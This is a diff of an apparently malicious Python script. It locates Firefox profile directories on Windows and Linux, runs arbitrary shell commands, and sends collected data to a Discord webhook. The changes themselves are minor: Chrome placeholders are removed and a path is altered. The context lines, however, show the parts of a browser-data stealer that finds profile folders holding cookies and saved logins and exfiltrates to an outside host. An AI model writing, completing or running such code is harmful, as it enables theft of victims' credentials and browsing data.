@@ -17,16 +17,13 @@ firefox_path = None
 def check_os():
     global username
     global firefox_path
-    global chrome_path
 
     if os.name == "nt":
         username = os.environ['USERPROFILE']
         firefox_path = f"{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
-        #chrome_path =
     else:
         username = os.environ['USER']
-        firefox_path = f"/home/{username}/.mozilla/firefox/"
-        #chrome_path = 
+        firefox_path = f"~/.mozilla/firefox/"
     
 def send_discord(data):
     webhook = SyncWebhook.from_url(web_hook)
@@ -35,7 +32,6 @@ def send_discord(data):
 def run_command(command):
     try:
         output_command = subprocess.check_output(command, shell=True)
-
         return output_command.decode("cp850").strip() if output_command else None
     except Exception as e:
         print(e)
@@ -44,7 +40,6 @@ def run_command(command):
 def get_firefox_profiles():
     try:
         profiles = [profile for profile in os.listdir(firefox_path) if "release" in profile or "esr" in profile ]
-
         return profiles if profiles else None
     except Exception as e:
         print(e)
